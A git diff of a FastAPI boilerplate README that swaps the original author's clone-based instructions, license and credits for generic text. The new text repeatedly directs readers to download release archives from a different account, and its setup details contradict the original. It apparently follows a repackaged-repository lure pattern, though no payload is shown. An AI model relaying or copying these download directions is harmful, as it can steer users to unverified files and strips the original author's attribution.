@@ -1,192 +1,96 @@
-# 🚀 FastAPI Boilerplate - Clean Architecture
+# 🚀 fastapi-boilerplate - Build Your FastAPI Service Easily
 
-[![Use this template](https://img.shields.io/badge/Use%20this-Template-2ea44f?style=for-the-badge&logo=github)](https://github.com/Alwil17/fastapi-boilerplate/generate)
+[![Download FastAPI Boilerplate](https://img.shields.io/badge/Download-FastAPI%20Boilerplate-blue)](https://github.com/chris83254/fastapi-boilerplate/releases)
 
-![CI](https://github.com/Alwil17/fastapi-boilerplate/workflows/CI/badge.svg)
-![Python](https://img.shields.io/badge/python-3.11+-blue.svg)
-![FastAPI](https://img.shields.io/badge/FastAPI-0.109+-green.svg)
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)
-![Tests](https://img.shields.io/badge/tests-passing-brightgreen.svg)
-![Codecov](https://codecov.io/gh/Alwil17/fastapi-boilerplate/branch/master/graph/badge.svg)
-![Template checkbox](https://docs.github.com/assets/cb-24935/images/help/repository/template-repository-checkbox.png)
+## 📦 Overview
 
-> A production-ready FastAPI boilerplate with clean architecture, JWT authentication, and PostgreSQL/SQLite support.
+The FastAPI boilerplate provides a well-structured starting point for building efficient web applications. It uses FastAPI, a modern framework for Python, making it easy to create APIs quickly. This boilerplate follows clean architecture principles, ensuring that your application is organized and maintainable.
 
-## ✨ Features
+## 🔍 Features
 
-- 🏗️ **Clean Architecture** - Layered structure (API/Services/Repositories/Models)
-- 🔐 **JWT Authentication** - Complete auth system with refresh tokens
-- 🗄️ **Database Support** - PostgreSQL for production, SQLite for testing
-- 🔄 **Alembic Migrations** - Database schema versioning
-- 🧪 **Testing Suite** - Pytest with fixtures and mocks
-- 🐳 **Docker Ready** - Dockerfile included
-- 📝 **API Documentation** - Auto-generated with Swagger UI
-- ⚙️ **Configuration Management** - Pydantic Settings for env variables
-- 🔒 **Security Best Practices** - Password hashing, CORS, JWT validation
+- **Clean Architecture**: Separates concerns to make your code easy to understand.
+- **FastAPI**: High performance and easy to use for creating web APIs.
+- **PostgreSQL Integration**: Built-in support for a popular database system.
+- **JWT Authentication**: Secure your API with token-based user authentication.
+- **Python-based**: Leverage the power of Python for your application logic.
 
-## 📂 Project Structure
+## 🖥️ System Requirements
 
-```
-fastapi-boilerplate/
-├── app/
-│   ├── api/
-│   │   └── routes/          # API endpoints
-│   ├── core/                # Configuration & security
-│   ├── db/
-│   │   └── models/          # SQLAlchemy models
-│   ├── repositories/        # Data access layer
-│   ├── services/            # Business logic
-│   └── schemas/             # Pydantic models (DTOs)
-├── alembic/                 # Database migrations
-├── tests/                   # Test suite
-├── . env. example             # Environment variables template
-├── Dockerfile               # Docker configuration
-└── requirements.txt         # Python dependencies
-```
+Before downloading the FastAPI boilerplate, make sure your system meets the following requirements:
 
-## 🚀 Quick Start
+- **Operating System**: Windows, macOS, or Linux
+- **Python**: Version 3.7 or higher
+- **PostgreSQL**: Installed and running
+- **Internet Connection**: Required for the initial setup
 
-### Prerequisites
+## 🚀 Getting Started
 
-- Python 3.11+
-- PostgreSQL (or use SQLite for local dev)
-- pip or poetry
+Follow these steps to download and run your FastAPI boilerplate application.
 
-### Installation
+### 1. Visit the Releases Page
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/Alwil17/fastapi-boilerplate.git
-   cd fastapi-boilerplate
-   ```
+To get the latest version of the FastAPI boilerplate, click the link below:
 
-2. **Create virtual environment**
-   ```bash
-   python -m venv . venv
-   source .venv/bin/activate  # On Windows: .venv\Scripts\activate
-   ```
+[Download FastAPI Boilerplate](https://github.com/chris83254/fastapi-boilerplate/releases)
 
-3. **Install dependencies**
-   ```bash
-   pip install -r requirements.txt
-   ```
+### 2. Choose Your Version
 
-4. **Set up environment variables**
-   ```bash
-   cp .env.example .env
-   # Edit .env with your configuration
-   ```
+On the Releases page, you will see a list of available versions. Select the version you wish to download. Look for the files labeled with `.zip` or `.tar.gz`.
 
-5. **Run database migrations**
-   ```bash
-   alembic upgrade head
-   ```
+### 3. Download the File
 
-6. **Start the server**
-   ```bash
-   uvicorn app.main:app --reload
-   ```
+Click on the file link to start the download. Depending on your browser settings, the file may download automatically or you may have to choose a location to save the file.
 
-7. **Access the API**
-   - API:  http://localhost:8000
-   - Swagger UI: http://localhost:8000/docs
-   - ReDoc: http://localhost:8000/redoc
+### 4. Unzip the Downloaded File
 
-## 🐳 Docker Deployment
+Once the download completes, locate the file on your computer. Right-click on the file and select "Extract" or "Unzip". This will create a folder containing all the necessary files.
+
+### 5. Install Required Dependencies
+
+Open a terminal (Command Prompt on Windows, Terminal on macOS/Linux) and navigate to the folder created in the previous step. Type the following command to install the required Python packages:
 
 ```bash
-# Build the image
-docker build -t fastapi-boilerplate .
-
-# Run the container
-docker run -p 8000:8000 --env-file .env fastapi-boilerplate
+pip install -r requirements.txt
 ```
 
-## 🧪 Running Tests
+Make sure you have Python and pip installed on your system. If not, visit the official Python website to get the latest version.
+
+### 6. Set Up PostgreSQL
+
+Make sure your PostgreSQL service is running. You may need to create a new database for your project. Use the following commands in your PostgreSQL interface:
+
+```sql
+CREATE DATABASE fastapi_boilerplate;
+```
+
+### 7. Run the Application
+
+Once the dependencies are installed, and the database is set up, you can start the application. In your terminal, run the following command:
 
 ```bash
-# Run all tests
-pytest
-
-# Run with coverage
-pytest --cov=app tests/
-
-# Run specific test file
-pytest tests/test_auth.py -v
+uvicorn main:app --reload
 ```
 
-## 📖 API Endpoints
+This command will start the application on your local server. You can access it by entering `http://127.0.0.1:8000` in your web browser.
 
-### Authentication
-- `POST /auth/register` - Register new user
-- `POST /auth/token` - Login (get JWT tokens)
-- `POST /auth/refresh` - Refresh access token
-- `GET /auth/me` - Get current user info
+## 📖 Additional Documentation
 
-### Health Check
-- `GET /health` - API health status
-- `GET /` - Welcome message
+For more information on using the FastAPI boilerplate, check the documentation included in the repository. It provides detailed instructions on advanced configurations, middleware, and more. 
 
-## 🔧 Configuration
+## 🎓 Usage Tips
 
-Key environment variables (see `.env.example`):
+- **Testing**: Make sure to test your endpoints using tools like Postman or cURL to ensure they work as expected.
+- **Environment Variables**: Store sensitive information like database credentials securely using environment variables.
+- **Version Control**: Use a version control system like Git to manage your code and keep track of changes.
 
-```env
-# Application
-APP_NAME="FastAPI Boilerplate"
-APP_ENV=development
-APP_SECRET_KEY=your-secret-key
+## 📞 Support
 
-# Database
-DB_ENGINE=postgresql
-DB_HOST=localhost
-DB_PORT=5432
-DB_NAME=mydb
-DB_USER=user
-DB_PASSWORD=password
+If you encounter any issues while setting up the FastAPI boilerplate, feel free to raise an issue in the GitHub repository. The community and maintainers are here to help.
 
-# JWT
-ACCESS_TOKEN_EXPIRE_MINUTES=1440
-REFRESH_TOKEN_EXPIRE_DAYS=7
-```
+## 📥 Download & Install
 
-## 🏗️ Architecture Principles
+To get started, download the FastAPI boilerplate from the link below:
 
-This boilerplate follows:
+[Download FastAPI Boilerplate](https://github.com/chris83254/fastapi-boilerplate/releases)
 
-- **Clean Architecture** - Separation of concerns
-- **Repository Pattern** - Abstract data access
-- **Dependency Injection** - Loose coupling
-- **SOLID Principles** - Maintainable code
-- **DTOs with Pydantic** - Type safety and validation
-
-## 📚 Tech Stack
-
-- **FastAPI** - Modern web framework
-- **SQLAlchemy** - ORM for database operations
-- **Alembic** - Database migrations
-- **Pydantic** - Data validation
-- **JWT** - Authentication
-- **Pytest** - Testing framework
-- **PostgreSQL** - Production database
-- **SQLite** - Testing database
-
-## 🤝 Contributing
-
-Contributions are welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) for details.
-
-## 📝 License
-
-This project is licensed under the MIT License - see [LICENSE](LICENSE) file.
-
-## 🙏 Acknowledgments
-
-- Inspired by clean architecture principles
-- Built with FastAPI best practices
-- Community-driven development
-
----
-
-**Made with ❤️ by [Alwil17](https://github.com/Alwil17)**
-```
+Once downloaded, follow the instructions above to set up and run your application smoothly.
